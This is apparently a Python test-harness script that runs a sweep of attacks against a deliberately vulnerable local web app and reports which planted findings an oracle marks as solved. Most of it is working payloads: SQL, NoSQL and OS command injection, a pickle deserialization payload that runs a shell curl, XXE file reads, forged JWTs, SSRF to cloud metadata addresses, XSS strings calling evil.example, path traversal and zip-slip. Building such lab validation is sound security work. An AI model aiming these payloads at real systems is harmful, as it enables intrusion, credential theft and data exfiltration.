#!/usr/bin/env python3
"""Exploit sweep: drive every LIVE finding and report oracle coverage.

Run against a running instance (see BASE/ORACLE). Prints solved vs. unsolved
live findings so we can close gaps. Used to validate Phase C before pytest.
"""
import os, sys, time, json, base64, hashlib, hmac, threading, io, zipfile
import requests

BASE = os.environ.get("SW_BASE", "http://127.0.0.1:8080")
ORACLE = os.environ.get("SW_ORACLE", "http://127.0.0.1:9090")
KEY = {"X-Oracle-Key": os.environ.get("SW_KEY", "sprkl-oracle-dev-key")}
JWT_SECRET = "sprkl"


def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def jwt(header, payload, key=None):
    h = b64u(json.dumps(header).encode()); p = b64u(json.dumps(payload).encode())
    si = f"{h}.{p}"
    if key is None:
        return si + "."  # alg none
    sig = hmac.new(key, si.encode(), hashlib.sha256).digest()
    return si + "." + b64u(sig)


def new(): return requests.Session()


def collab(tok):
    requests.get(f"{BASE}/collab/{tok}", timeout=5)


def run():
    # ---------- 04 INJECTION ----------
    s = new(); s.post(f"{BASE}/retail/login", data={"email": "alice@example.com' -- ", "password": "x"})
    new().get(f"{BASE}/search", params={"q": "lime'"})
    new().get(f"{BASE}/products", params={"category": "zz' UNION SELECT id,email,secret,loyalty FROM users-- "})
    new().get(f"{BASE}/products", params={"in_stock": "1 AND substr((SELECT secret FROM users LIMIT 1),1,1)='S'"})
    new().get(f"{BASE}/retail/track", params={"ref": "x' OR sleep(2)-- "})
    new().post(f"{BASE}/retail/cart/giftmessage", data={"message": "{{7*7}}"})
    # nosql login + search
    new().post(f"{BASE}/admin/api/login", json={"username": "admin", "password": {"$ne": None}})
    new().post(f"{BASE}/api/v2/newsletter/find", json={"email": {"$regex": ".*"}})
    # os command (need corp session)
    cs = new(); cs.post(f"{BASE}/admin/login", data={"username": "admin", "password": "admin"})
    cs.post(f"{BASE}/admin/labels/generate", data={"filename": "x; echo SPRKLPWN"})
    # blind command injection (oast)
    tok = f"cmd-{int(time.time()*1000)}"
    cs.post(f"{BASE}/admin/tools/ping", data={"host": f"127.0.0.1; curl -s {BASE}/collab/{tok}"})
    time.sleep(1.5)
    # ldap, xpath, crlf, smtp, orm, graphql-sqli, code-injection, ssti(done)
    cs.get(f"{BASE}/admin/directory", params={"u": "*"})
    new().get(f"{BASE}/products/1/spec", params={"field": "*"})
    new().get(f"{BASE}/go/track", params={"next": "foo\r\nSet-Cookie: x=1"})
    new().post(f"{BASE}/contact", data={"email": "a@b.c\nBcc: evil@x.com", "subject": "s", "message": "m"})
    new().get(f"{BASE}/api/v2/products", params={"filter": "1=1 UNION SELECT id,email,secret,loyalty FROM users"})
    new().post(f"{BASE}/graphql", json={"query": '{ product(slug:"x\' UNION SELECT id,email,secret FROM users-- ") { id } }'})
    new().post(f"{BASE}/retail/cart/apply-coupon", data={"code": "FORMULA", "subtotal": "100", "formula": "__import__('os').getpid()"})
    # second-order sqli: store injected name then trigger report
    al = new(); tokj = requests.post(f"{BASE}/api/v2/login", json={"email": "alice@example.com", "password": "password1"}).json()["token"]
    hdr = {"Authorization": f"Bearer {tokj}"}
    requests.patch(f"{BASE}/api/v2/account", json={"name": "z' UNION SELECT id,email,secret FROM users-- "}, headers=hdr)
    new().get(f"{BASE}/api/v2/admin/report")

    # ---------- 02 ACCESS CONTROL ----------
    new().get(f"{BASE}/api/v2/users/2")
    new().get(f"{BASE}/retail/orders/1001/invoice")
    new().get(f"{BASE}/retail/wishlist", params={"uid": "2"})
    new().get(f"{BASE}/api/v2/giftcards/2")
    new().get(f"{BASE}/admin/reports/financials")
    new().get(f"{BASE}/admin/public/..%2fadmin/console")
    new().post(f"{BASE}/api/v2/admin/users/2/role", json={"role": "admin"})   # bfla + logging gap
    requests.put(f"{BASE}/api/v2/admin/flags", json={"maintenance": "on"})
    new().post(f"{BASE}/api/v2/products/1", headers={"X-HTTP-Method-Override": "DELETE"})
    # mass assignment
    requests.patch(f"{BASE}/api/v2/account", json={"role": "admin"}, headers=hdr)
    # multi-tenant: carol (org100) reads org200
    ct = requests.post(f"{BASE}/api/v2/login", json={"email": "carol@sprkl-corp.com", "password": "Summer2026!"}).json()["token"]
    requests.get(f"{BASE}/api/v2/orgs/200/orders", headers={"Authorization": f"Bearer {ct}"})

    # ---------- 03 AUTH ----------
    # jwt alg none / weak secret / kid
    requests.get(f"{BASE}/api/v2/users/2", headers={"Authorization": "Bearer " + jwt({"alg": "none", "typ": "JWT"}, {"sub": 1, "role": "admin"})})
    requests.get(f"{BASE}/api/v2/users/2", headers={"Authorization": "Bearer " + jwt({"alg": "HS256", "typ": "JWT", "kid": "main"}, {"sub": 4, "role": "admin"}, JWT_SECRET.encode())})
    jskey = open(os.path.join(os.path.dirname(__file__), "..", "app", "static", "app.js"), "rb").read()
    requests.get(f"{BASE}/api/v2/users/2", headers={"Authorization": "Bearer " + jwt({"alg": "HS256", "typ": "JWT", "kid": "app.js"}, {"sub": 1, "role": "admin"}, jskey)})
    # predictable reset
    minute = int(time.time() // 60); email = "bob@example.com"
    rtok = hashlib.md5(f"{email}:{minute}".encode()).hexdigest()
    new().get(f"{BASE}/retail/reset", params={"token": rtok, "email": email})
    # session fixation
    new().post(f"{BASE}/retail/login-fixation", params={"sid": "attacker123"}, data={"email": "alice@example.com", "password": "password1"})
    # weak session token
    new().get(f"{BASE}/retail/whoami", cookies={"remember": base64.b64encode(b"2:1").decode()})
    # mfa bypass
    ms = new(); ms.post(f"{BASE}/admin/mfa/begin"); ms.get(f"{BASE}/admin/tools/mfa-skip")
    # oauth redirect
    new().get(f"{BASE}/retail/oauth/authorize", params={"redirect_uri": "http://evil.example/cb"}, allow_redirects=False)
    # credential stuffing
    cst = new()
    for _ in range(7): cst.post(f"{BASE}/retail/api-login", data={"email": "alice@example.com", "password": "wrong"})

    # ---------- 05 DESERIALIZATION ----------
    # pickle rce (oast)
    ptok = f"pk-{int(time.time()*1000)}"
    import pickle as _pk
    class Ex:
        def __reduce__(self):
            import os as _os
            return (_os.system, (f"curl -s {BASE}/collab/{ptok}",))
    blob = base64.b64encode(_pk.dumps(Ex())).decode()
    cs.post(f"{BASE}/admin/prefs/import", data={"prefs": blob}); time.sleep(1.0)
    # xxe import + svg
    flag = os.path.realpath(os.path.join(os.path.dirname(__file__), "..", "instance", "flag.txt"))
    xxe = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{flag}">]><r>&x;</r>'
    cs.post(f"{BASE}/admin/inventory/import", data=xxe, headers={"Content-Type": "application/xml"})
    svg = f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file://{flag}">]><svg>&x;</svg>'.encode()
    new().post(f"{BASE}/retail/account/avatar", files={"file": ("a.svg", svg, "image/svg+xml")})
    # prototype pollution
    new().post(f"{BASE}/api/v2/preferences", json={"__proto__": {"is_admin": True}})

    # ---------- 06 SSRF ----------
    stok = f"ssrf-{int(time.time()*1000)}"
    new().post(f"{BASE}/retail/account/avatar-from-url", data={"url": "http://internal-service.internal/"})
    new().post(f"{BASE}/retail/account/avatar-from-url", data={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
    new().post(f"{BASE}/retail/account/avatar-from-url", data={"url": "http://2852039166/latest/meta-data/iam/"})
    wtok = f"wh-{int(time.time()*1000)}"
    cs.post(f"{BASE}/admin/integrations/webhook/test", data={"url": "http://10.0.0.5/"})
    cs.post(f"{BASE}/admin/integrations/fx-sync", data={"upstream": "http://fx.internal/rates"})
    new().post(f"{BASE}/retail/reset/request", data={"email": "bob@example.com"}, headers={"Host": "evil.example"})
    # web cache deception + poisoning
    new().get(f"{BASE}/retail/account/profile.css")  # populate
    new().get(f"{BASE}/retail/account/profile.css")  # deception (diff actor)
    requests.get(f"{BASE}/cached-home", headers={"X-Forwarded-Host": "evil.example"})
    requests.get(f"{BASE}/cached-home")

    # ---------- 07 CLIENT-SIDE ----------
    new().get(f"{BASE}/search", params={"q": "<script>alert(1)</script>"})
    # stored xss review
    rv = new(); rv.post(f"{BASE}/retail/login", data={"email": "alice@example.com' -- ", "password": "x"})
    rv.post(f"{BASE}/retail/products/1/review", data={"body": "<script>alert(1)</script>"})
    new().get(f"{BASE}/product/1")
    # dom xss (arm via q, beacon)
    new().get(f"{BASE}/search", params={"hl": "<img src=x onerror=alert(1)>"})
    # csti
    new().get(f"{BASE}/ref-landing", params={"ref": "{{7*7}}"})
    # mutation xss (arm via review render)
    rv.post(f"{BASE}/retail/products/2/review", data={"body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>"})
    new().get(f"{BASE}/product/2")
    # dangling markup (arm via submit_review)
    rv.post(f"{BASE}/retail/products/3/review", data={"body": "<img src='http://evil.example/?x="})
    new().get(f"{BASE}/product/3")
    # blind xss contact (arm via contact, admin views inbox, beacon)
    new().post(f"{BASE}/contact", data={"email": "x@x.c", "subject": "s", "message": "<script>alert(document.cookie)</script>"})
    cs.get(f"{BASE}/admin/support/inbox")
    # csrf change email
    rv.post(f"{BASE}/retail/account/email", data={"email": "attacker@evil.example"}, headers={"Origin": "http://evil.example"})
    # cors
    requests.get(f"{BASE}/api/v2/account", headers={"Authorization": f"Bearer {tokj}", "Origin": "http://evil.example"})
    # open redirect
    new().get(f"{BASE}/go", params={"url": "http://evil.example"}, allow_redirects=False)
    # clickjacking
    new().get(f"{BASE}/retail/wallet/transfer", params={"framed": "1"})
    # csp bypass
    new().get(f"{BASE}/promo", params={"msg": "<img src=x onerror=alert(1)>"})
    # postmessage
    new().get(f"{BASE}/embed/widget", params={"msg": "fetch('http://evil.example/steal')"})

    # ---------- 08 FILE/PATH ----------
    new().get(f"{BASE}/retail/invoices/download", params={"file": "../flag.txt"})
    new().post(f"{BASE}/retail/account/avatar", data={"content_type": "image/png", "filename": "shell.php", "data": "x"})
    up = new(); up.post(f"{BASE}/retail/account/avatar", files={"file": ("shell.html", b"{{7*7}}", "text/html")})
    up.get(f"{BASE}/retail/uploads/shell.html")
    cs.get(f"{BASE}/admin/render", params={"theme": "../../../../etc/passwd"})
    zbuf = io.BytesIO(); z = zipfile.ZipFile(zbuf, "w"); z.writestr("../evil.txt", "x"); z.close()
    cs.post(f"{BASE}/admin/inventory/import-zip", files={"file": ("a.zip", zbuf.getvalue(), "application/zip")})

    # ---------- 09 BUSINESS LOGIC ----------
    new().post(f"{BASE}/retail/cart/update", data={"qty": "-5"})
    new().post(f"{BASE}/retail/cart/update", data={"qty": str(2**31)})
    cp = new()
    for _ in range(2): cp.post(f"{BASE}/retail/cart/apply-coupon", data={"code": "ONCE20", "subtotal": "100"})
    wf = new(); wf.post(f"{BASE}/retail/checkout/confirm")
    rl = new()
    for i in range(12): rl.post(f"{BASE}/retail/cart/guess-coupon", headers={"X-Forwarded-For": f"10.0.0.{i}"})
    rf = new(); rf.post(f"{BASE}/retail/login", data={"email": "carol@sprkl-corp.com", "password": "Summer2026!"})
    rf.post(f"{BASE}/retail/referral/redeem", data={"code": "REF-CAROL"})
    # race
    def redeem(): new().post(f"{BASE}/retail/wallet/redeem", data={"code": "GC-ALICE-1", "uid": "1"})
    ts = [threading.Thread(target=redeem) for _ in range(4)]
    [t.start() for t in ts]; [t.join() for t in ts]

    # ---------- 10 CRYPTO ----------
    # sensitive-data + plaintext already via /users/2
    # weak randomness
    wr = new(); wr.get(f"{BASE}/retail/promo/token")
    import random as _r
    predicted = _r.Random(1337 + 1).randint(100000, 999999)
    wr.get(f"{BASE}/retail/promo/claim", params={"token": predicted})
    # padding oracle
    po = new()
    for i in range(60): po.get(f"{BASE}/retail/coupon/decrypt", params={"enc": "A" * 32 + str(i)})
    # hash length extension (lab: compute with known secret)
    data = "role=admin"
    mac = hashlib.md5(b"s3cr3t" + data.encode()).hexdigest()
    new().get(f"{BASE}/retail/profile/load", cookies={"profile": f"{data}.{mac}"})
    # secrets in js
    new().get(f"{BASE}/api/v2/keycheck", params={"key": "SPRKL-CANARY-JSKEY-9c1f2a"})

    # ---------- 11 CONFIG ----------
    new().get(f"{BASE}/debug")
    new().post(f"{BASE}/admin/login", data={"username": "admin", "password": "admin"})
    new().get(f"{BASE}/api/v2/echo", params={"n": "abc"})
    new().get(f"{BASE}/audit/security-headers")
    new().get(f"{BASE}/status"); new().get(f"{BASE}/api/v2/advisory", params={"q": "SPRKL-CANARY-CVE-2021-9999"})
    new().get(f"{BASE}/.env")
    new().get(f"{BASE}/assets/", params={"list": "1"}); new().get(f"{BASE}/assets/private/payroll-2024.csv")

    # ---------- 12 API PROTOCOL ----------
    new().post(f"{BASE}/graphql", json={"query": "{ __schema { types } }"})
    new().post(f"{BASE}/graphql", json={"query": "{ user(id:2){ id email secret } }"})
    aliases = " ".join(f"a{i}:x" for i in range(25))
    new().post(f"{BASE}/graphql", json={"query": "{ " + aliases + " }"})
    new().post(f"{BASE}/api/v2/products/1", headers={"X-HTTP-Method-Override": "DELETE"})  # rest-verb
    new().get(f"{BASE}/api/v1/users/2")
    new().get(f"{BASE}/api/v2/products", params={"limit": "100"})
    # unsafe consumption already via fx-sync
    requests.get(f"{BASE}/ws/notifications", params={"uid": "2"}, headers={"Origin": "http://evil.example"})


def report():
    live = [f for f in requests.get(f"{ORACLE}/oracle/findings", headers=KEY).json()["findings"]
            if f["status"] == "live"]
    solved = {s["finding_id"] for s in requests.get(f"{ORACLE}/oracle/solves", headers=KEY).json()["solves"]}
    live_ids = {f["id"] for f in live}
    got = solved & live_ids
    missing = sorted(live_ids - solved)
    print(f"\nSOLVED {len(got)}/{len(live_ids)} live findings")
    if missing:
        print(f"\nUNSOLVED ({len(missing)}):")
        for m in missing:
            print("  -", m)


if __name__ == "__main__":
    requests.post(f"{ORACLE}/oracle/reset", headers=KEY)
    run()
    time.sleep(1)
    report()
